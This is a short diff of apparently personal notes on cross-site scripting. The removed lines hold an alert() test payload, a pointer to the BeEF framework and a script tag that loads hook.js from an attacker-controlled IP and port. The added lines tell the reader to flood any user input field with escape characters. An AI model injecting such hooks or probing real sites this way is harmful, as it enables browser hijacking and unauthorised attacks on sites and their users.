@@ -1,6 +1,2 @@
-#js #javascript #xss
-Test script: <script>alert('yo')</script>
-https://github.com/beefproject/beef
-inspect element, go to where the text box is
-Run beef, find Hook URL
-<script src="http://IP:PORT/hook.js"></script>
+I'll write this, I swear.
+But until I do that, just find some place that takes user inputs and spam in all the escape characters you could possibly dream of.
